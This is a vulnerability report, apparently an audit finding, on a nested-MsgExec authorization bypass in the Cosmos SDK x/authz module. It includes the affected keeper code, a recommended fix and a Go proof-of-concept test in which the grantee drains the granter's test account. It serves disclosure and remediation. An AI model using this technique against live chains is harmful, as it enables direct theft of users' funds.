## Title
Nested MsgExec Authorization Bypass Allows Unauthorized Message Execution

## Summary
A critical vulnerability in the x/authz module allows a grantee with `GenericAuthorization` for `MsgExec` to bypass authorization checks and execute arbitrary message types on behalf of the granter without specific authorization. By nesting `MsgExec` messages, an attacker can exploit the "implicit accept" logic to execute unauthorized actions, leading to direct loss of funds. [1](#0-0) 

## Impact
**High** - Direct loss of funds

## Finding Description

**Location:** 
The vulnerability exists in `x/authz/keeper/keeper.go` in the `DispatchActions` function, specifically at lines 87-111, combined with the `GetSigners()` implementation in `x/authz/msgs.go` at lines 212-218. [2](#0-1) [3](#0-2) 

**Intended Logic:**
The authorization system is designed to allow a granter to authorize a grantee to execute specific message types on their behalf. The `DispatchActions` function checks if the message's signer (granter) differs from the current grantee, and if so, verifies that proper authorization exists. The "implicit accept" logic at line 89 is intended to allow users to execute their own messages without authorization when granter equals grantee.

**Actual Logic:**
The vulnerability arises because:
1. `MsgExec.GetSigners()` returns the `grantee` field of the MsgExec message, not the actual transaction signer
2. When a nested `MsgExec` is executed, the inner MsgExec's `grantee` field becomes the "granter" in the authorization check
3. This allows an attacker to set the inner MsgExec's grantee to the granter's address, causing the innermost messages to bypass authorization via the "implicit accept" path (granter == grantee)

**Exploit Scenario:**
1. Alice grants Bob `GenericAuthorization` for `/cosmos.authz.v1beta1.MsgExec` (thinking it's for a specific legitimate purpose)
2. Bob crafts a transaction with nested MsgExec messages:
   - Outer `MsgExec`: grantee=Bob (signed by Bob)
   - Inner `MsgExec`: grantee=Alice
   - Innermost message: `MsgSend` transferring all of Alice's funds to Bob
3. When the outer MsgExec executes:
   - `DispatchActions(ctx, Bob, [inner_MsgExec])` is called
   - Inner MsgExec's `GetSigners()` returns [Alice]
   - Authorization check: Does Bob have authorization from Alice for MsgExec? YES
   - Inner MsgExec handler is invoked
4. When the inner MsgExec executes:
   - `DispatchActions(ctx, Alice, [MsgSend])` is called
   - MsgSend's `GetSigners()` returns [Alice]
   - Check: Alice == Alice? YES
   - "Implicit accept" - NO authorization check performed
   - MsgSend executes, draining Alice's account

**Security Failure:**
The authorization invariant is broken. Bob can execute message types (like `MsgSend`) on Alice's behalf without Alice granting Bob specific authorization for those message types. The implicit accept logic meant to allow users to execute their own messages is exploited through nested MsgExec to bypass authorization.

## Impact Explanation

**Assets Affected:**
All funds controlled by any account that has granted `GenericAuthorization` for `MsgExec` to another party.

**Severity:**
- **Direct loss of funds:** An attacker can drain the entire balance of the granter's account
- **Bypasses all authorization controls:** The attacker only needs authorization for `MsgExec` but can execute ANY message type (bank transfers, staking operations, governance votes, etc.)
- **Completely circumvents spend limits:** Even if the granter intended limited authorization, this bypass allows unlimited access

**System Impact:**
This vulnerability undermines the core security model of the x/authz module, which is designed to provide fine-grained authorization control. Users who grant `GenericAuthorization` for `MsgExec` (which might seem harmless for specific nested authorization workflows) unknowingly grant complete control over their account.

## Likelihood Explanation

**Who Can Trigger:**
Any user who receives `GenericAuthorization` for `MsgExec` from another account can exploit this vulnerability.

**Conditions Required:**
- The granter must grant `GenericAuthorization` (or any authorization that accepts MsgExec) for `/cosmos.authz.v1beta1.MsgExec` to the attacker
- This is the ONLY authorization required - no authorization for the actual message types being executed is needed

**Frequency:**
- Can be triggered immediately after receiving the authorization
- Works during normal network operation
- No special timing or state requirements
- Highly likely to be exploited if users grant MsgExec authorization (which they might do for legitimate nested authorization use cases)

## Recommendation

Add a check to prevent nested `MsgExec` messages, or modify the authorization logic to properly validate nested executions. Specifically:

**Option 1 (Simplest):** Disallow `MsgExec` as an authorized message type by adding validation in the `Grant` method:

```go
// In x/authz/keeper/msg_server.go, Grant method
t := authorization.MsgTypeURL()
if t == sdk.MsgTypeURL(&authz.MsgExec{}) {
    return nil, sdkerrors.Wrapf(sdkerrors.ErrInvalidType, "cannot grant authorization for MsgExec")
}
```

**Option 2 (More flexible):** Track the authorization context and prevent the implicit accept when inside a MsgExec execution by passing a context flag through `DispatchActions` to indicate whether the execution is nested.

The simplest and safest fix is Option 1, which prevents granting authorization for `MsgExec` entirely, as nested MsgExec creates complex authorization chains that are difficult to reason about securely.

## Proof of Concept

**File:** `x/authz/keeper/keeper_test.go`

**Test Function:** Add the following test function to the existing `TestSuite`:

```go
// TestNestedMsgExecAuthorizationBypass demonstrates the vulnerability where
// a grantee with GenericAuthorization for MsgExec can bypass authorization
// checks for other message types by nesting MsgExec messages.
func (s *TestSuite) TestNestedMsgExecAuthorizationBypass() {
	app, ctx, addrs := s.app, s.ctx, s.addrs
	
	aliceAddr := addrs[0]  // granter/victim
	bobAddr := addrs[1]    // grantee/attacker
	
	// Setup: Fund Alice's account with 10000 tokens
	require := s.Require()
	initialBalance := sdk.NewCoins(sdk.NewInt64Coin("steak", 10000))
	require.NoError(simapp.FundAccount(app.BankKeeper, ctx, aliceAddr, initialBalance))
	
	// Verify Alice's initial balance
	aliceBalance := app.BankKeeper.GetAllBalances(ctx, aliceAddr)
	require.Equal(initialBalance, aliceBalance)
	
	// Alice grants Bob GenericAuthorization for MsgExec
	// (Alice thinks this is for a specific nested authorization workflow)
	now := ctx.BlockHeader().Time
	msgExecAuth := authz.NewGenericAuthorization(sdk.MsgTypeURL(&authz.MsgExec{}))
	err := app.AuthzKeeper.SaveGrant(ctx, bobAddr, aliceAddr, msgExecAuth, now.Add(time.Hour))
	require.NoError(err)
	
	// NOTE: Alice has NOT granted Bob authorization for MsgSend
	// Verify no SendAuthorization exists
	sendAuth, _ := app.AuthzKeeper.GetCleanAuthorization(ctx, bobAddr, aliceAddr, bankSendAuthMsgType)
	require.Nil(sendAuth)
	
	// Attack: Bob crafts nested MsgExec to steal Alice's funds
	stolenAmount := sdk.NewCoins(sdk.NewInt64Coin("steak", 10000))
	
	// Innermost message: MsgSend from Alice to Bob
	innerMsgSend := &banktypes.MsgSend{
		FromAddress: aliceAddr.String(),
		ToAddress:   bobAddr.String(),
		Amount:      stolenAmount,
	}
	
	// Inner MsgExec with grantee=Alice (this is the key to the exploit)
	innerMsgExec := authz.NewMsgExec(aliceAddr, []sdk.Msg{innerMsgSend})
	
	// Outer MsgExec with grantee=Bob (signed by Bob in actual transaction)
	outerMsgExec := authz.NewMsgExec(bobAddr, []sdk.Msg{&innerMsgExec})
	
	// Execute the attack
	require.NoError(outerMsgExec.UnpackInterfaces(app.AppCodec()))
	msgs, err := outerMsgExec.GetMessages()
	require.NoError(err)
	
	// This should fail because Bob doesn't have SendAuthorization from Alice
	// But due to the vulnerability, it succeeds
	result, err := app.AuthzKeeper.DispatchActions(ctx, bobAddr, msgs)
	
	// Observation: The attack succeeds when it should fail
	require.NoError(err, "Attack succeeded - vulnerability confirmed!")
	require.NotNil(result)
	
	// Verify funds were stolen: Alice's balance is now 0, Bob received the funds
	aliceFinalBalance := app.BankKeeper.GetAllBalances(ctx, aliceAddr)
	bobFinalBalance := app.BankKeeper.GetAllBalances(ctx, bobAddr)
	
	require.True(aliceFinalBalance.IsZero(), "Alice's funds were drained")
	require.True(bobFinalBalance.IsEqual(stolenAmount), "Bob received Alice's funds")
	
	// This demonstrates that Bob executed MsgSend on Alice's behalf
	// without Alice granting Bob authorization for MsgSend
}
```

**Setup:**
- Initialize three test accounts (Alice, Bob, and a third unused account)
- Fund Alice's account with 10,000 tokens
- Alice grants Bob `GenericAuthorization` for `MsgExec` (but NOT for `MsgSend`)

**Trigger:**
- Bob creates a nested MsgExec structure:
  - Outer: `MsgExec(grantee=Bob, msgs=[inner_MsgExec])`
  - Inner: `MsgExec(grantee=Alice, msgs=[MsgSend])`
  - Innermost: `MsgSend(from=Alice, to=Bob, amount=10000)`
- Call `DispatchActions` with the outer MsgExec

**Observation:**
The test confirms the vulnerability by observing:
1. The `DispatchActions` call succeeds (when it should fail due to lack of MsgSend authorization)
2. Alice's balance is drained to zero
3. Bob receives all of Alice's funds
4. This happens despite Alice never granting Bob authorization for `MsgSend`

The test demonstrates that the authorization system can be bypassed, allowing unauthorized message execution and direct loss of funds.

### Citations

**File:** x/authz/keeper/keeper.go (L74-139)
```go
// DispatchActions attempts to execute the provided messages via authorization
// grants from the message signer to the grantee.
func (k Keeper) DispatchActions(ctx sdk.Context, grantee sdk.AccAddress, msgs []sdk.Msg) ([][]byte, error) {
	results := make([][]byte, len(msgs))

	for i, msg := range msgs {
		signers := msg.GetSigners()
		if len(signers) != 1 {
			return nil, sdkerrors.ErrInvalidRequest.Wrap("authorization can be given to msg with only one signer")
		}

		granter := signers[0]

		// If granter != grantee then check authorization.Accept, otherwise we
		// implicitly accept.
		if !granter.Equals(grantee) {
			authorization, _ := k.GetCleanAuthorization(ctx, grantee, granter, sdk.MsgTypeURL(msg))
			if authorization == nil {
				return nil, sdkerrors.ErrUnauthorized.Wrap("authorization not found")
			}
			resp, err := authorization.Accept(ctx, msg)
			if err != nil {
				return nil, err
			}

			if resp.Delete {
				err = k.DeleteGrant(ctx, grantee, granter, sdk.MsgTypeURL(msg))
			} else if resp.Updated != nil {
				err = k.update(ctx, grantee, granter, resp.Updated)
			}
			if err != nil {
				return nil, err
			}

			if !resp.Accept {
				return nil, sdkerrors.ErrUnauthorized
			}
		}

		handler := k.router.Handler(msg)
		if handler == nil {
			return nil, sdkerrors.ErrUnknownRequest.Wrapf("unrecognized message route: %s", sdk.MsgTypeURL(msg))
		}

		msgResp, err := handler(ctx, msg)
		if err != nil {
			return nil, sdkerrors.Wrapf(err, "failed to execute message; message %v", msg)
		}

		results[i] = msgResp.Data

		// emit the events from the dispatched actions
		events := msgResp.Events
		sdkEvents := make([]sdk.Event, 0, len(events))
		for _, event := range events {
			e := event
			e.Attributes = append(e.Attributes, abci.EventAttribute{Key: []byte("authz_msg_index"), Value: []byte(strconv.Itoa(i))})

			sdkEvents = append(sdkEvents, sdk.Event(e))
		}

		ctx.EventManager().EmitEvents(sdkEvents)
	}

	return results, nil
}
```

**File:** x/authz/msgs.go (L211-218)
```go
// GetSigners implements Msg
func (msg MsgExec) GetSigners() []sdk.AccAddress {
	grantee, err := sdk.AccAddressFromBech32(msg.Grantee)
	if err != nil {
		panic(err)
	}
	return []sdk.AccAddress{grantee}
}
```
